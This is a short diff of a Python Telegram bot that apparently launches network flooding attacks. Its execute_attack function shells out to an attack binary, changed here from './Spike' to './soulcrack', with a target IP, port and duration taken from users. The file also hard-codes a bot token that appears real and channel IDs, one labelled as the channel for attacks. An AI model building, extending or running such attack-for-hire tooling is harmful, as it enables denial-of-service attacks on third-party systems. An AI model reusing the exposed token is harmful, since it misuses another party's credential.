@@ -19,7 +19,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 # Telegram bot token and channel IDs
 TOKEN = '8083299517:AAG_jnYf-aabaVYYTHKQGcTAVXaa0vyzsSw'  # Replace with your actual bot token
 CHANNEL_ID = '-1002659515656'  # Replace with your specific channel or group ID for attacks
-FEEDBACK_CHANNEL_ID = '-1002688374033'  # Replace with your specific channel ID for feedback
+FEEDBACK_CHANNEL_ID = '-1002543508263'  # Replace with your specific channel ID for feedback
 message_queue = []
 
 
@@ -280,7 +280,7 @@ async def execute_attack(ip, port, duration, username):
     try:
         # Start the attack process with predefined values
         proc = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 12 750",
+            f"./soulcrack {ip} {port} {duration}",
             stderr=asyncio.subprocess.PIPE
         )
 
